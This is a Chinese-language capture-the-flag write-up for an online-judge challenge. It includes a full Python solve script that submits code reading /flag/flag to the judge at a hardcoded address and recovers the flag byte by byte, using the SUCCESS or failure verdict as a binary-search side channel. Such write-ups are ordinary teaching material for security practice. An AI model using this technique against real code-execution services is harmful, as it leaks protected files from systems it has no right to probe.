# online_judge

> 分类：Pwn（侧信道）

## 题目描述

在线评测系统，flag 在 `/flag/flag` 中。利用侧信道（类似盲注）逐个爆破 flag 字符。

## 考察知识点

- 侧信道攻击（时间盲注）
- 二分法爆破

## 解法

题目提示 flag 在 `/flag/flag` 中。test 只有一个测试用例，可通过侧信道爆破（类似 web 盲注），逐个爆破 flag 字符。

用 Python 脚本二分法爆破，读 flag 内容并与猜测值比较，正确时输出特定标记，根据评测结果 `SUCCESS`/失败判断：

```python
import requests

host, port = '47.104.129.38', 10101
base_url = f'http://{host}:{port}'
token_url = f'{base_url}/getToken'
judge_url = f'{base_url}/judge'

def getToken():
    result = requests.post(token_url).json()
    return result['data']['token']

token = getToken()

def judge(chall, src, language='C'):
    data = {'src': src, 'language': language, 'action': chall, 'token': token}
    return requests.post(judge_url, json=data).json()

flag = ''
for num in range(0, 100):
    low = 32; high = 127; mid = (high + low) // 2
    while high > low:
        py = f"""
import time
a,b = map(int,input().split(' '))
f = list(open('/flag/flag','rb').read())
if f[{num}] < {mid}:
    print('ERERER')
print(a+b)
"""
        rl = judge('test', py, 'PYTHON')
        if rl['data'] == 'SUCCESS':
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 127 or mid == 32:
        break
    flag += chr(mid - 1)
    print(flag)
```

## 参考答案

（flag 通过侧信道二分法逐个爆破 `/flag/flag` 内容得到）

## 来源

- 作者：S1gMa | https://www.cnblogs.com/S1gMa/p/17007231.html
- 作者：Shark-one | https://blog.csdn.net/xccwxy/article/details/128664878
